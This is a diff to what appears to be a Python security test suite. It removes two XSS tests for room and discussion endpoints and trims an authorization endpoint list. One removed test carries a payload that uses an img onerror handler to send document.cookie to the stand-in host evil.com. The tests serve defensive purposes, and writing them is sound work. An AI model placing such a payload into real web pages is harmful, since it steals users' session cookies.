@@ -246,26 +246,6 @@ class TestXSSPrevention:
         if resp.status_code in (200, 201):
             assert "name" in resp.json()
 
-    def test_xss_in_room_name(self, app_client, auth_headers):
-        resp = app_client.post(
-            "/api/v1/rooms",
-            headers=auth_headers,
-            json={"name": "<script>alert('xss')</script>"},
-        )
-        assert resp.status_code in (200, 201)
-
-    def test_xss_in_discussion_title(self, app_client, auth_headers):
-        resp = app_client.post(
-            "/api/v1/discussions",
-            headers=auth_headers,
-            json={
-                "title": '<img onerror="fetch(`evil.com?c=${document.cookie}`)">',
-                "context_type": "member",
-                "context_id": "xss-test",
-            },
-        )
-        assert resp.status_code in (200, 201)
-
 
 # ---------------------------------------------------------------------------
 # File Upload Security
@@ -303,8 +283,6 @@ class TestAuthorization:
         get_endpoints = [
             "/api/v1/conversations",
             "/api/v1/members",
-            "/api/v1/rooms",
-            "/api/v1/discussions",
         ]
         for path in get_endpoints:
             resp = app_client.get(path)
